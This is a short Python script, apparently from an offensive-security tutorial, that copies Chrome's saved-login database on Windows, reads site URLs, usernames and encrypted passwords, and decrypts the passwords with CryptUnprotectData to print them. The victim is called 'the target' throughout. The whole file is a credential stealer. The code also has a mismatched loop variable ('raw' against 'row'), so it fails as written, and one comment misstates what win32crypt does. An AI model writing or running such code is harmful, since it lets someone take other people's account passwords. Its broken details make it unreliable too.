from os import getenv # to find out the chrome SQL path which is >> C:\\Users\%USERNAME%\AppData\Local\Google\Chrome\User Dta\Default\Login Data
import sqlite3  # to read the chrome SQLite DB
import win32crypt  # To make a copy of the Chrome SQlite DB
from shutil import copyfile # To make a copy of the Chrome SQlite DB

# LOCALAPPDATA is a windows Environment Variable which points to >>>> C:\\Users\{username}\Appdata\Local
path = getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data"
# if the target waslogging in to a site which has an entry into the DB , then sometimes reading the chrome DB will return an  error  that the DB is locked
# OperationalError: database is locked
# the workaround for this, is to make a copy the login Data DB and pull out the data out od the copied DB
path2 = getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login2"
copyfile(path,path2)

#  connect to the copied databse
conn = sqlite3.connect(path2)

cursor = conn.cursor() # create a cursor object  and call its execute() method to perform SQL commands like select

# select column_name,column_name from table_name
# select action_url and username_value and password_value from table login
cursor.execute('SELECT action_url, username_value, password_value FROM logins')

# to retrieve data after executing  a select statement, we call  fetchall() to get list of matching rows
for raw in cursor.fetchall():
    print(row[0] + '\n' + raw[1]) 
    password = win32crypt.CryptUnprotectData(raw[2])[1]
    print(password)

conn.close()